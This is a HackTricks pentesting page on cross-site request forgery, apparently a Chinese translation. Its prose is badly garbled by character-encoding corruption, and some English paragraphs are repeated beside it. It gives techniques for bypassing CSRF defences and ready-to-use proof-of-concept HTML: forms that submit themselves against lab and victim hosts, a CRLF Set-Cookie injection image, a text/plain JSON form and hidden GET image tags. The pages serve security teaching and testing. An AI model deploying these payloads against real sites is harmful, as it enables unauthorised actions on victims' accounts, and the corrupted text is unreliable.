# CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProofæ˜¯æ‰€æœ‰åŠ å¯†æ¼æ´èµé‡‘çš„å®¶å›­ã€‚**

**å³æ—¶è·å¾—å¥–åŠ±**\
HackenProofçš„èµé‡‘åªæœ‰åœ¨å®¢æˆ·å­˜å…¥å¥–åŠ±é¢„ç®—åæ‰ä¼šå¯åŠ¨ã€‚åœ¨æ¼æ´ç»è¿‡éªŒè¯åï¼Œæ‚¨å°†è·å¾—å¥–åŠ±ã€‚

**åœ¨web3æ¸—é€æµ‹è¯•ä¸­ç§¯ç´¯ç»éªŒ**\
åŒºå—é“¾åè®®å’Œæ™ºèƒ½åˆçº¦æ˜¯æ–°çš„äº’è”ç½‘ï¼åœ¨å…¶å…´èµ·çš„æ—¥å­é‡ŒæŒæ¡web3å®‰å…¨ã€‚

**æˆä¸ºweb3é»‘å®¢ä¼ å¥‡**\
æ¯æ¬¡éªŒè¯çš„æ¼æ´éƒ½ä¼šè·å¾—å£°èª‰ç§¯åˆ†ï¼Œå¹¶å æ®æ¯å‘¨æ’è¡Œæ¦œçš„æ¦œé¦–ã€‚

[**åœ¨HackenProofä¸Šæ³¨å†Œ**](https://hackenproof.com/register)å¼€å§‹ä»æ‚¨çš„é»‘å®¢è¡ŒåŠ¨ä¸­è·åˆ©ï¼

{% embed url="https://hackenproof.com/register" %}

## ä»€ä¹ˆæ˜¯CSRFï¼Ÿ

**è·¨ç«™è¯·æ±‚ä¼ªé€ **ï¼ˆä¹Ÿç§°ä¸ºCSRFï¼‰æ˜¯ä¸€ç§Webå®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…**è¯±ä½¿ç”¨æˆ·æ‰§è¡Œä»–ä»¬ä¸æ‰“ç®—æ‰§è¡Œçš„æ“ä½œ**ã€‚\
è¿™æ˜¯é€šè¿‡ä½¿å—å®³è€…å¹³å°ä¸Šçš„å·²ç™»å½•ç”¨æˆ·è®¿é—®æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç«™ï¼Œç„¶åä»é‚£é‡Œ**æ‰§è¡Œ**æ¶æ„JSä»£ç ã€å‘é€è¡¨å•æˆ–æ£€ç´¢â€œå›¾åƒâ€åˆ°**å—å®³è€…è´¦æˆ·**æ¥å®ç°çš„ã€‚

### å…ˆå†³æ¡ä»¶

è¦æ»¥ç”¨CSRFæ¼æ´ï¼Œé¦–å…ˆéœ€è¦**æ‰¾åˆ°ä¸€ä¸ªç›¸å…³çš„æ“ä½œæ¥æ»¥ç”¨**ï¼ˆæ›´æ”¹å¯†ç æˆ–ç”µå­é‚®ä»¶ã€è®©å—å®³è€…åœ¨ç¤¾äº¤ç½‘ç»œä¸Šå…³æ³¨æ‚¨ã€ç»™æ‚¨æ›´å¤šæƒé™ç­‰ï¼‰ã€‚ä¼šè¯å¿…é¡»ä»…ä¾èµ–äºcookieæˆ–HTTPåŸºæœ¬èº«ä»½éªŒè¯æ ‡å¤´ï¼Œä¸èƒ½ä½¿ç”¨ä»»ä½•å…¶ä»–æ ‡å¤´æ¥å¤„ç†ä¼šè¯ã€‚æœ€åï¼Œè¯·æ±‚ä¸­**ä¸åº”è¯¥æœ‰ä¸å¯é¢„æµ‹çš„å‚æ•°**ã€‚

å¯ä»¥é‡‡å–å¤šç§**å¯¹ç­–**æ¥é¿å…æ­¤æ¼æ´ã€‚

### **å¸¸è§çš„é˜²å¾¡æªæ–½**

* [**SameSite cookies**](hacking-with-cookies/#samesite)ï¼šå¦‚æœä¼šè¯cookieä½¿ç”¨æ­¤æ ‡å¿—ï¼Œæ‚¨å¯èƒ½æ— æ³•ä»ä»»æ„ç½‘ç«™å‘é€cookieã€‚
* [**è·¨æºèµ„æºå…±äº«**](cors-bypass.md)ï¼šæ ¹æ®æ‚¨éœ€è¦æ‰§è¡Œçš„HTTPè¯·æ±‚ç±»å‹ï¼Œæ‚¨å¯èƒ½éœ€è¦è€ƒè™‘å—å®³ç«™ç‚¹çš„**CORSç­–ç•¥**ã€‚_è¯·æ³¨æ„ï¼ŒCORSç­–ç•¥ä¸ä¼šå½±å“æ‚¨åªæƒ³ä»è¡¨å•å‘é€GETè¯·æ±‚æˆ–POSTè¯·æ±‚è€Œä¸éœ€è¦è¯»å–å“åº”çš„æƒ…å†µã€‚_
* è¦æ±‚ç”¨æˆ·è¾“å…¥**å¯†ç **ä»¥æˆæƒæ“ä½œã€‚
* è§£æ**Referrer**æˆ–**Origin**æ ‡å¤´ã€‚å¦‚æœä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç»•è¿‡ï¼š
* http://mal.net?orig=http://example.comï¼ˆä»¥è¯¥URLç»“å°¾ï¼‰
* http://example.com.mal.netï¼ˆä»¥è¯¥URLå¼€å¤´ï¼‰
* **ä¿®æ”¹**Postæˆ–Getè¯·æ±‚çš„**å‚æ•°åç§°**
* åœ¨æ¯ä¸ªä¼šè¯ä¸­ä½¿ç”¨**CSRFä»¤ç‰Œ**ã€‚æ­¤ä»¤ç‰Œå¿…é¡»åœ¨è¯·æ±‚ä¸­å‘é€ä»¥ç¡®è®¤æ“ä½œã€‚æ­¤ä»¤ç‰Œå¯ä»¥å—åˆ°CORSçš„ä¿æŠ¤ã€‚

### CSRFæ˜ å°„

![](<../.gitbook/assets/image (112).png>)

## é˜²å¾¡ç»•è¿‡

### ä»POSTåˆ°GET

ä¹Ÿè®¸æ‚¨è¦æ»¥ç”¨çš„è¡¨å•å‡†å¤‡å‘é€**å¸¦æœ‰CSRFä»¤ç‰Œçš„POSTè¯·æ±‚**ï¼Œä½†æ˜¯ï¼Œæ‚¨åº”è¯¥**æ£€æŸ¥**æ˜¯å¦ä¹Ÿå¯ä»¥å‘é€**GETè¯·æ±‚**ï¼Œå¹¶ä¸”åœ¨å‘é€GETè¯·æ±‚æ—¶**ä»ç„¶éªŒè¯CSRFä»¤ç‰Œ**ã€‚

### ç¼ºå°‘ä»¤ç‰Œ

æŸäº›åº”ç”¨ç¨‹åºåœ¨ä»¤ç‰Œå­˜åœ¨æ—¶**æ­£ç¡®éªŒè¯ä»¤ç‰Œï¼Œä½†å¦‚æœçœç•¥äº†ä»¤ç‰Œï¼Œåˆ™è·³è¿‡éªŒè¯**ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥**åˆ é™¤åŒ…å«ä»¤ç‰Œçš„æ•´ä¸ªå‚æ•°**ï¼ˆè€Œä¸ä»…ä»…æ˜¯å…¶å€¼ï¼‰ï¼Œä»¥ç»•è¿‡éªŒè¯å¹¶è¿›è¡ŒCSRFæ”»å‡»ã€‚

### CSRFä»¤ç‰Œä¸ç”¨æˆ·ä¼šè¯æ— å…³

æŸäº›åº”ç”¨ç¨‹åº**ä¸éªŒè¯ä»¤ç‰Œæ˜¯å¦å±äºå‘å‡ºè¯·æ±‚çš„ç”¨æˆ·ä¼šè¯**ã€‚ç›¸åï¼Œåº”ç”¨ç¨‹åºç»´æŠ¤ä¸€ä¸ªå…¨å±€ä»¤ç‰Œæ± ï¼Œæ¥å—å‡ºç°åœ¨æ­¤æ± ä¸­çš„ä»»ä½•ä»¤ç‰Œã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨è‡ªå·±çš„å¸æˆ·ç™»å½•åº”ç”¨ç¨‹åºï¼Œ**è·å–æœ‰æ•ˆä»¤ç‰Œ**ï¼Œç„¶åå°†è¯¥ä»¤ç‰Œæä¾›ç»™å—å®³è€…ç”¨æˆ·è¿›è¡ŒCSRFæ”»å‡»ã€‚

### æ–¹æ³•ç»•è¿‡

å¦‚æœè¯·æ±‚ä½¿ç”¨äº†â€œ**å¥‡æ€ªçš„**â€**æ–¹æ³•**ï¼Œè¯·æ£€æŸ¥**æ–¹æ³•è¦†ç›–åŠŸèƒ½**æ˜¯å¦æ­£å¸¸å·¥ä½œã€‚\
ä¾‹å¦‚ï¼Œå¦‚æœä½¿ç”¨äº†**PUT**æ–¹æ³•ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿ç”¨**POST**æ–¹æ³•å¹¶å‘é€ï¼š_https://example.com/my/dear/api/val/num?**\_method=PUT**_

è¿™ä¹Ÿå¯ä»¥é€šè¿‡åœ¨POSTè¯·æ±‚ä¸­å‘é€**\_methodå‚æ•°**æˆ–ä½¿ç”¨**æ ‡å¤´**æ¥å®ç°ï¼š

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_
### è‡ªå®šä¹‰å¤´éƒ¨ä»¤ç‰Œç»•è¿‡

å¦‚æœè¯·æ±‚ä¸­æ·»åŠ äº†ä¸€ä¸ªå¸¦æœ‰ä»¤ç‰Œçš„è‡ªå®šä¹‰å¤´éƒ¨ä½œä¸ºCSRFä¿æŠ¤æ–¹æ³•ï¼Œåˆ™ï¼š

* åœ¨è¯·æ±‚ä¸­æµ‹è¯•ä¸å¸¦è‡ªå®šä¹‰ä»¤ç‰Œå’Œå¤´éƒ¨çš„æƒ…å†µã€‚
* åœ¨è¯·æ±‚ä¸­æµ‹è¯•ä»¤ç‰Œé•¿åº¦ç›¸åŒä½†å†…å®¹ä¸åŒçš„æƒ…å†µã€‚

### CSRFä»¤ç‰Œç”±CookieéªŒè¯

åœ¨å‰é¢çš„æ¼æ´çš„è¿›ä¸€æ­¥å˜ç§ä¸­ï¼Œä¸€äº›åº”ç”¨ç¨‹åºå°†æ¯ä¸ªä»¤ç‰Œå¤åˆ¶åˆ°ä¸€ä¸ªCookieå’Œä¸€ä¸ªè¯·æ±‚å‚æ•°ä¸­ã€‚æˆ–è€…åœ¨åç«¯è®¾ç½®ä¸€ä¸ªCSRF Cookieï¼Œå¹¶åœ¨åç«¯æ£€æŸ¥å‘é€çš„CSRFä»¤ç‰Œæ˜¯å¦ä¸Cookieç›¸å…³è”ã€‚

å½“éªŒè¯åç»­è¯·æ±‚æ—¶ï¼Œåº”ç”¨ç¨‹åºåªéœ€éªŒè¯è¯·æ±‚å‚æ•°ä¸­æäº¤çš„ä»¤ç‰Œæ˜¯å¦ä¸Cookieä¸­å­˜å‚¨çš„å€¼åŒ¹é…ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœç½‘ç«™åŒ…å«ä»»ä½•å…è®¸æ”»å‡»è€…å°†è‡ªå·±çš„CSRF Cookieè®¾ç½®ä¸ºå—å®³è€…çš„æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥å†æ¬¡æ‰§è¡ŒCSRFæ”»å‡»ã€‚

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥å°è¯•åŠ è½½ä¸€ä¸ªä¼ªé€ çš„å›¾åƒæ¥è®¾ç½®Cookieï¼Œç„¶ååƒè¿™ä¸ªä¾‹å­ä¸€æ ·å‘èµ·CSRFæ”»å‡»ï¼š
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>
```
{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå¦‚æœ**csrfä»¤ç‰Œä¸ä¼šè¯cookieç›¸å…³è”ï¼Œæ­¤æ”»å‡»å°†æ— æ•ˆ**ï¼Œå› ä¸ºæ‚¨éœ€è¦å°†æ‚¨çš„ä¼šè¯è®¾ç½®ä¸ºå—å®³è€…ï¼Œå› æ­¤æ‚¨å°†æ”»å‡»è‡ªå·±ã€‚
{% endhint %}

### æ›´æ”¹Content-Type

æ ¹æ®[**è¿™é‡Œ**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests)ï¼Œä¸ºäº†**é¿å…é¢„æ£€è¯·æ±‚**ä½¿ç”¨**POST**æ–¹æ³•ï¼Œè¿™äº›æ˜¯å…è®¸çš„Content-Typeå€¼ï¼š

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

ç„¶è€Œï¼Œè¯·æ³¨æ„ï¼Œ**æœåŠ¡å™¨é€»è¾‘å¯èƒ½ä¼šæœ‰æ‰€ä¸åŒ**ï¼Œå–å†³äºä½¿ç”¨çš„Content-Typeï¼Œå› æ­¤æ‚¨åº”è¯¥å°è¯•ä¸Šè¿°æåˆ°çš„å€¼ä»¥åŠå…¶ä»–å€¼ï¼Œå¦‚**`application/json`**_**,**_**`text/xml`**ï¼Œ**`application/xml`**_._

å‘é€JSONæ•°æ®ä½œä¸ºtext/plainçš„ç¤ºä¾‹ï¼ˆæ¥è‡ª[è¿™é‡Œ](https://brycec.me/posts/corctf\_2021\_challenges)ï¼‰ï¼š
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### application/jsoné¢„æ£€è¯·æ±‚ç»•è¿‡

æ­£å¦‚ä½ å·²ç»çŸ¥é“çš„ï¼Œä½ ä¸èƒ½é€šè¿‡HTMLè¡¨å•å‘é€Content-Typeä¸º`application/json`çš„POSTè¯·æ±‚ï¼Œå¦‚æœä½ å°è¯•é€šè¿‡`XMLHttpRequest`è¿™æ ·åšï¼Œé¦–å…ˆä¼šå‘é€ä¸€ä¸ªé¢„æ£€è¯·æ±‚ã€‚\
ç„¶è€Œï¼Œä½ å¯ä»¥å°è¯•ä½¿ç”¨`text/plain`å’Œ`application/x-www-form-urlencoded`è¿™ä¸¤ç§å†…å®¹ç±»å‹å‘é€JSONæ•°æ®ï¼Œåªæ˜¯ä¸ºäº†æ£€æŸ¥åç«¯æ˜¯å¦ç‹¬ç«‹äºContent-Typeä½¿ç”¨æ•°æ®ã€‚\
ä½ å¯ä»¥ä½¿ç”¨`Content-Type: text/plain`è®¾ç½®`enctype="text/plain"`æ¥å‘é€ä¸€ä¸ªè¡¨å•ã€‚

å¦‚æœæœåŠ¡å™¨åªæ¥å—Content-Typeä¸º"application/json"çš„å†…å®¹ç±»å‹ï¼Œä½ å¯ä»¥å‘é€Content-Typeä¸º"text/plain; application/json"çš„å†…å®¹è€Œä¸è§¦å‘é¢„æ£€è¯·æ±‚ã€‚

ä½ è¿˜å¯ä»¥å°è¯•ä½¿ç”¨SWF Flashæ–‡ä»¶æ¥ç»•è¿‡è¿™ä¸ªé™åˆ¶ã€‚æ›´å¤šä¿¡æ¯è¯·é˜…è¯»[è¿™ç¯‡æ–‡ç« ](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)ã€‚

### ç»•è¿‡Referrer / Originæ£€æŸ¥

**é¿å…ä½¿ç”¨Referrerå¤´**

ä¸€äº›åº”ç”¨ç¨‹åºåœ¨è¯·æ±‚ä¸­éªŒè¯Refererå¤´æ˜¯å¦å­˜åœ¨ï¼Œä½†å¦‚æœçœç•¥äº†è¯¥å¤´ï¼Œåˆ™è·³è¿‡éªŒè¯ã€‚
```markup
<meta name="referrer" content="never">
```
**æ­£åˆ™è¡¨è¾¾å¼ç»•è¿‡**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

è¦åœ¨Referrerå°†å‘é€åˆ°å‚æ•°ä¸­çš„URLä¸­è®¾ç½®æœåŠ¡å™¨çš„åŸŸåï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **HEADæ–¹æ³•ç»•è¿‡**

[**è¿™ä¸ªCTFè§£ç­”**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution)çš„ç¬¬ä¸€éƒ¨åˆ†è§£é‡Šäº†[Oakçš„æºä»£ç ](https://github.com/oakserver/oak/blob/main/router.ts#L281)ï¼Œä¸€ä¸ªè·¯ç”±å™¨è¢«è®¾ç½®ä¸ºå°†**HEADè¯·æ±‚å¤„ç†ä¸ºæ— å“åº”ä½“çš„GETè¯·æ±‚** - è¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„è§£å†³æ–¹æ³•ï¼Œä¸ä»…ä»…é€‚ç”¨äºOakã€‚ä¸å¤„ç†HEADè¯·æ±‚çš„ç‰¹å®šå¤„ç†ç¨‹åºä¸åŒï¼Œå®ƒä»¬åªæ˜¯**äº¤ç»™GETå¤„ç†ç¨‹åºï¼Œä½†åº”ç”¨ç¨‹åºä¼šåˆ é™¤å“åº”ä½“**ã€‚

å› æ­¤ï¼Œå¦‚æœGETè¯·æ±‚å—é™ï¼Œæ‚¨å¯ä»¥**å‘é€ä¸€ä¸ªå°†è¢«å¤„ç†ä¸ºGETè¯·æ±‚çš„HEADè¯·æ±‚**ã€‚

## **åˆ©ç”¨ç¤ºä¾‹**

### **çªƒå–CSRFä»¤ç‰Œ**

å¦‚æœä½¿ç”¨**CSRFä»¤ç‰Œ**ä½œä¸º**é˜²å¾¡**ï¼Œæ‚¨å¯ä»¥å°è¯•é€šè¿‡æ»¥ç”¨[XSS](xss-cross-site-scripting/#xss-stealing-csrf-tokens)æ¼æ´æˆ–[æ‚¬æŒ‚æ ‡è®°](dangling-markup-html-scriptless-injection/)æ¼æ´æ¥**çªƒå–å®ƒ**ã€‚

### **ä½¿ç”¨HTMLæ ‡ç­¾è¿›è¡ŒGETè¯·æ±‚**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
å…¶ä»–å¯ä»¥ç”¨äºè‡ªåŠ¨å‘é€GETè¯·æ±‚çš„HTML5æ ‡ç­¾æœ‰ï¼š

![](<../.gitbook/assets/image (530).png>)

### è¡¨å•GETè¯·æ±‚
```markup
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### è¡¨å•POSTè¯·æ±‚

A common method for submitting data to a web server is through a form POST request. This is typically used when a user fills out a form on a website and clicks the submit button. The form data is then sent to the server using the HTTP POST method.

ä¸€ä¸ªå¸¸è§çš„å‘WebæœåŠ¡å™¨æäº¤æ•°æ®çš„æ–¹æ³•æ˜¯é€šè¿‡è¡¨å•POSTè¯·æ±‚ã€‚å½“ç”¨æˆ·åœ¨ç½‘ç«™ä¸Šå¡«å†™è¡¨å•å¹¶ç‚¹å‡»æäº¤æŒ‰é’®æ—¶ï¼Œé€šå¸¸ä¼šä½¿ç”¨è¿™ç§æ–¹æ³•ã€‚è¡¨å•æ•°æ®éšåä½¿ç”¨HTTP POSTæ–¹æ³•å‘é€åˆ°æœåŠ¡å™¨ã€‚

To perform a CSRF attack, an attacker can create a malicious webpage that includes a form with hidden fields. When a user visits this webpage, their browser will automatically submit the form to the target website, without the user's knowledge or consent.

ä¸ºäº†è¿›è¡ŒCSRFæ”»å‡»ï¼Œæ”»å‡»è€…å¯ä»¥åˆ›å»ºä¸€ä¸ªæ¶æ„ç½‘é¡µï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªå¸¦æœ‰éšè—å­—æ®µçš„è¡¨å•ã€‚å½“ç”¨æˆ·è®¿é—®æ­¤ç½‘é¡µæ—¶ï¼Œä»–ä»¬çš„æµè§ˆå™¨å°†è‡ªåŠ¨å°†è¡¨å•æäº¤åˆ°ç›®æ ‡ç½‘ç«™ï¼Œè€Œç”¨æˆ·å¹¶ä¸çŸ¥æƒ…æˆ–åŒæ„ã€‚

The hidden fields can contain values that the attacker wants to submit to the target website, such as changing the user's password or making a purchase on their behalf. Since the request is coming from the user's browser, the target website may mistakenly believe that the request is legitimate and process it accordingly.

éšè—å­—æ®µå¯ä»¥åŒ…å«æ”»å‡»è€…æƒ³è¦æäº¤åˆ°ç›®æ ‡ç½‘ç«™çš„å€¼ï¼Œä¾‹å¦‚æ›´æ”¹ç”¨æˆ·çš„å¯†ç æˆ–ä»£è¡¨ç”¨æˆ·è¿›è¡Œè´­ä¹°ã€‚ç”±äºè¯·æ±‚æ¥è‡ªç”¨æˆ·çš„æµè§ˆå™¨ï¼Œç›®æ ‡ç½‘ç«™å¯èƒ½ä¼šé”™è¯¯åœ°è®¤ä¸ºè¯·æ±‚æ˜¯åˆæ³•çš„ï¼Œå¹¶ç›¸åº”åœ°å¤„ç†å®ƒã€‚

To protect against CSRF attacks, web developers can implement measures such as using anti-CSRF tokens, which are unique tokens generated for each user session. These tokens are included in the form and are validated by the server to ensure that the request is legitimate.

ä¸ºäº†é˜²æ­¢CSRFæ”»å‡»ï¼ŒWebå¼€å‘äººå‘˜å¯ä»¥é‡‡å–æªæ–½ï¼Œä¾‹å¦‚ä½¿ç”¨åCSRFä»¤ç‰Œï¼Œè¿™äº›ä»¤ç‰Œæ˜¯ä¸ºæ¯ä¸ªç”¨æˆ·ä¼šè¯ç”Ÿæˆçš„å”¯ä¸€ä»¤ç‰Œã€‚è¿™äº›ä»¤ç‰ŒåŒ…å«åœ¨è¡¨å•ä¸­ï¼Œå¹¶ç”±æœåŠ¡å™¨éªŒè¯ï¼Œä»¥ç¡®ä¿è¯·æ±‚æ˜¯åˆæ³•çš„ã€‚

By validating the anti-CSRF token, the server can verify that the request originated from the same website and not from a malicious source. This helps prevent CSRF attacks by ensuring that only requests from trusted sources are processed.

é€šè¿‡éªŒè¯åCSRFä»¤ç‰Œï¼ŒæœåŠ¡å™¨å¯ä»¥éªŒè¯è¯·æ±‚æ˜¯å¦æ¥è‡ªåŒä¸€ç½‘ç«™ï¼Œè€Œä¸æ˜¯æ¥è‡ªæ¶æ„æ¥æºã€‚è¿™æœ‰åŠ©äºé€šè¿‡ç¡®ä¿ä»…å¤„ç†æ¥è‡ªå¯ä¿¡æºçš„è¯·æ±‚æ¥é˜²æ­¢CSRFæ”»å‡»ã€‚
```markup
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### é€šè¿‡iframeè¿›è¡Œè¡¨å•POSTè¯·æ±‚

In some cases, attackers can exploit Cross-Site Request Forgery (CSRF) vulnerabilities by using iframes to perform form POST requests. This technique is commonly known as "iframe-based CSRF" or "CSRF through iframes".

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨iframeæ¥æ‰§è¡Œè¡¨å•POSTè¯·æ±‚ï¼Œä»è€Œåˆ©ç”¨è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰æ¼æ´ã€‚è¿™ç§æŠ€æœ¯é€šå¸¸è¢«ç§°ä¸ºâ€œåŸºäºiframeçš„CSRFâ€æˆ–â€œé€šè¿‡iframeçš„CSRFâ€ã€‚

Attackers can create a hidden iframe on a malicious website that loads a target website's form. The attacker then fills in the form fields with malicious data and submits the form using JavaScript. Since the iframe is hidden, the user is unaware of the malicious activity.

æ”»å‡»è€…å¯ä»¥åœ¨æ¶æ„ç½‘ç«™ä¸Šåˆ›å»ºä¸€ä¸ªéšè—çš„iframeï¼ŒåŠ è½½ç›®æ ‡ç½‘ç«™çš„è¡¨å•ã€‚ç„¶åï¼Œæ”»å‡»è€…ä½¿ç”¨JavaScriptå¡«å……è¡¨å•å­—æ®µï¼Œå¹¶æäº¤è¡¨å•ã€‚ç”±äºiframeæ˜¯éšè—çš„ï¼Œç”¨æˆ·å¯¹æ¶æ„æ´»åŠ¨æ¯«ä¸çŸ¥æƒ…ã€‚

When the form is submitted, the browser sends the POST request to the target website, including any session cookies associated with the target website. This allows the attacker to perform actions on behalf of the user without their consent.

å½“è¡¨å•è¢«æäº¤æ—¶ï¼Œæµè§ˆå™¨ä¼šå°†POSTè¯·æ±‚å‘é€åˆ°ç›®æ ‡ç½‘ç«™ï¼Œå¹¶åŒ…å«ä¸ç›®æ ‡ç½‘ç«™ç›¸å…³çš„ä»»ä½•ä¼šè¯cookieã€‚è¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ä»£è¡¨ç”¨æˆ·æ‰§è¡Œæ“ä½œã€‚

To protect against iframe-based CSRF attacks, web developers should implement measures such as:

ä¸ºäº†é˜²æ­¢åŸºäºiframeçš„CSRFæ”»å‡»ï¼ŒWebå¼€å‘äººå‘˜åº”è¯¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š

- Implementing CSRF tokens: Include a unique token in each form submission and verify it on the server-side to ensure that the request is legitimate.

- å®æ–½CSRFä»¤ç‰Œï¼šåœ¨æ¯ä¸ªè¡¨å•æäº¤ä¸­åŒ…å«ä¸€ä¸ªå”¯ä¸€çš„ä»¤ç‰Œï¼Œå¹¶åœ¨æœåŠ¡å™¨ç«¯è¿›è¡ŒéªŒè¯ï¼Œä»¥ç¡®ä¿è¯·æ±‚æ˜¯åˆæ³•çš„ã€‚

- Implementing SameSite cookies: Set the SameSite attribute to "Strict" or "Lax" for cookies to restrict their usage in cross-site requests.

- å®æ–½SameSite cookieï¼šå°†SameSiteå±æ€§è®¾ç½®ä¸ºâ€œStrictâ€æˆ–â€œLaxâ€ï¼Œä»¥é™åˆ¶cookieåœ¨è·¨ç«™è¯·æ±‚ä¸­çš„ä½¿ç”¨ã€‚

- Implementing CSRF protection frameworks: Utilize frameworks like Django's CSRF protection or OWASP's CSRFGuard to add an additional layer of security against CSRF attacks.

- å®æ–½CSRFä¿æŠ¤æ¡†æ¶ï¼šä½¿ç”¨åƒDjangoçš„CSRFä¿æŠ¤æˆ–OWASPçš„CSRFGuardè¿™æ ·çš„æ¡†æ¶ï¼Œä¸ºé˜²æ­¢CSRFæ”»å‡»å¢åŠ é¢å¤–çš„å®‰å…¨å±‚ã€‚

By implementing these measures, web developers can mitigate the risk of CSRF attacks through iframes and protect user data and privacy.

